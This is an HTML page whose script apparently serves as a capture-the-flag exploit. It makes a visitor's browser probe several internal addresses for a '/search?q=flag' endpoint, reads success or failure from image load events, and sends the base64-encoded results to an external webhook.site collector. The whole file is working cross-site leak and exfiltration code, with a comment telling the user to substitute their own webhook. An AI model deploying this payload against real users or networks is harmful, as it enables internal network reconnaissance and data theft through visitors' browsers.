<!DOCTYPE html>
<html>
<body>
<script>
const targets = [
    "http://127.0.0.1:5000/search?q=flag",
    "http://localhost:5000/search?q=flag",
    "http://ctf_web:5000/search?q=flag",
    "http://10.25.0.1:5000/search?q=flag",
    "http://10.25.7.111:5000/search?q=flag"
];

const webhook = "https://webhook.site/eed6e086-4677-4691-8515-ecf1b5559f63";  // ← 改你的 webhook

targets.forEach(target => {
    const img = new Image();
    img.src = `${webhook}?leak=${btoa(target)}`; // 告訴 webhook: 嘗試開始

    const leak = new Image();
    leak.src = `${target}`;
    
    leak.onload = () => {
        const success = new Image();
        success.src = `${webhook}?leak=${btoa(target + " success")}`;
    };
    
    leak.onerror = () => {
        const fail = new Image();
        fail.src = `${webhook}?leak=${btoa(target + " fail")}`;
    };
});
</script>
</body>
</html>

